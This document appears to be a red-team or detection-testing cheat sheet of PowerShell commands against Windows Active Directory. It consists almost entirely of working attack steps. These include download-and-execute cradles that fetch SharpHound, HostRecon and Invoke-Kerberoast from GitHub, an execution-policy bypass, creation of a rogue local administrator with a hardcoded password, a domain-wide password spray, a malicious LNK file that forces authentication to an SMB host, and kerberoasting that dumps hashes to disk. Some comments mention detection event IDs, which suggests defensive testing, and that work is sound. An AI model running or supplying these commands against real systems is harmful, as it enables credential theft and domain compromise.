# Attacks-Some



# PowerShell invoke-expression of BloodHound 
# First tho, enable TLS1.2 for PowerShell

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1')
Invoke-BloodHound


# This time, copy the BloodHound containers down
# First tho, disable PowerShell's progress bar, which causes ridiculously slow downloads
# Then, enable TLS1.2 for PowerShell

$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest –URI https://github.com/BloodHoundAD/BloodHound/archive/master.zip -OutFile "master.zip" 
Expand-Archive master.zip
Import-Module .\master\BloodHound-master\Collectors\SharpHound.ps1
Invoke-BloodHound



# Let's run a few commands to check on detections for:
# 1. user additions
# 2. maybe privileged group modifications -- should be EID 4799?

net1 user bhissoctest Soctest12! /add
net1 localgroup administrators bhissoctest /add



# Check on current domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()



# Run local host recon script
# As always, make sure PowerShell supports TLS traffic

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1')
Invoke-HostRecon |Out-File recon.txt



# Password spray against all users!
# Gather archives first

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -URI "https://github.com/dafthack/DomainPasswordSpray/archive/master.zip" -OutFile "~\Downloads\master.zip"

# Expand DPS .zip file

cd ~\Downloads\
Expand-Archive "master.zip"

# cd to the correct directory and execute the attack

cd ~\Downloads\master\DomainPasswordSpray-master
Set-ExecutionPolicy Bypass -Force
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2020! -Force



# Create a malicious LNK file
# Triggers here might be sysmon event ID 11 (file create boolean on .lnk)
# Or, suspicious wscript execution

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\users\Public\Malicious.lnk")
$lnk.TargetPath = "\\10.10.98.20\@threat.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing the desktop should trigger silent auth."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()




# Add an SPN to an account
# Domain may need to change here
# This is kerberoasting

setspn -a ws01/administrator.labs.local:1433 labs.local\administrator
setspn -T labs.local -Q */* 
set-ExecutionPolicy bypass -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath ‘c:\users\public\HashCapture.txt’ -Width 8000 

